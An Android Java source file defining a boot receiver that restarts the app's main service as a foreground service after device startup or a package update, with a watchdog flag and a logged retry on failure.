package com.fason.app.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import com.fason.app.core.Protocol;
import com.fason.app.service.MainService;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        String action = intent.getAction();
        if (action == null) return;
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)) {
            startSvc(context);
        }
    }

    private void startSvc(Context ctx) {
        WatchdogReceiver.setServiceActive(ctx, true);
        try {
            Intent svcIntent = new Intent(ctx, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(svcIntent);
            } else {
                ctx.startService(svcIntent);
            }
        } catch (Exception e) {
            Log.w(TAG, "Boot start failed, worker will retry", e);
        }
    }
}
